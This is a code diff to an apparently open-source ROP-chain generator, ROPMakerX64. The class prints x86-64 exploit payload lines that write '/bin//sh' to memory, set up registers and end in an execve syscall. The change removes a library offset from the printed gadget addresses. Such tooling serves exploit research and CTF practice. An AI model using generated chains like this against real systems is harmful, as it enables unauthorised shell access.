@@ -97,47 +97,47 @@ class ROPMakerX64:
         print "\t# Padding goes here"
         print "\tp = ''\n"
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(popDst["vaddr"] + self.__liboffset, popDst["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(popDst["vaddr"], popDst["gadget"])
         print "\tp += pack('<Q', 0x%016x) # @ .data" %(dataAddr)
         self.__padding(popDst, {})
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(popSrc["vaddr"] + self.__liboffset, popSrc["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(popSrc["vaddr"], popSrc["gadget"])
         print "\tp += '/bin//sh'"
         self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr}) # Don't overwrite reg dst
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(write4where["vaddr"] + self.__liboffset, write4where["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(write4where["vaddr"], write4where["gadget"])
         self.__padding(write4where, {})
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(popDst["vaddr"] + self.__liboffset, popDst["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(popDst["vaddr"], popDst["gadget"])
         print "\tp += pack('<Q', 0x%016x) # @ .data + 8" %(dataAddr + 8)
         self.__padding(popDst, {})
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(xorSrc["vaddr"] + self.__liboffset, xorSrc["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(xorSrc["vaddr"], xorSrc["gadget"])
         self.__padding(xorSrc, {})
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(write4where["vaddr"] + self.__liboffset, write4where["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(write4where["vaddr"], write4where["gadget"])
         self.__padding(write4where, {})
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(popRdi["vaddr"] + self.__liboffset, popRdi["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(popRdi["vaddr"], popRdi["gadget"])
         print "\tp += pack('<Q', 0x%016x) # @ .data" %(dataAddr)
         self.__padding(popRdi, {})
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(popRsi["vaddr"] + self.__liboffset, popRsi["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(popRsi["vaddr"], popRsi["gadget"])
         print "\tp += pack('<Q', 0x%016x) # @ .data + 8" %(dataAddr + 8)
         self.__padding(popRsi, {"rdi": dataAddr}) # Don't overwrite rdi
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(popRdx["vaddr"] + self.__liboffset, popRdx["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(popRdx["vaddr"], popRdx["gadget"])
         print "\tp += pack('<Q', 0x%016x) # @ .data + 8" %(dataAddr + 8)
         self.__padding(popRdx, {"rdi": dataAddr, "rsi": dataAddr + 8}) # Don't overwrite rdi and rsi
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(xorRax["vaddr"] + self.__liboffset, xorRax["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(xorRax["vaddr"], xorRax["gadget"])
         self.__padding(xorRax, {"rdi": dataAddr, "rsi": dataAddr + 8}) # Don't overwrite rdi and rsi
 
         for i in range(59):
-            print "\tp += pack('<Q', 0x%016x) # %s" %(incRax["vaddr"] + self.__liboffset, incRax["gadget"])
+            print "\tp += pack('<Q', 0x%016x) # %s" %(incRax["vaddr"], incRax["gadget"])
             self.__padding(incRax, {"rdi": dataAddr, "rsi": dataAddr + 8}) # Don't overwrite rdi and rsi
 
-        print "\tp += pack('<Q', 0x%016x) # %s" %(syscall["vaddr"] + self.__liboffset, syscall["gadget"])
+        print "\tp += pack('<Q', 0x%016x) # %s" %(syscall["vaddr"], syscall["gadget"])
 
     def __generate(self):
 
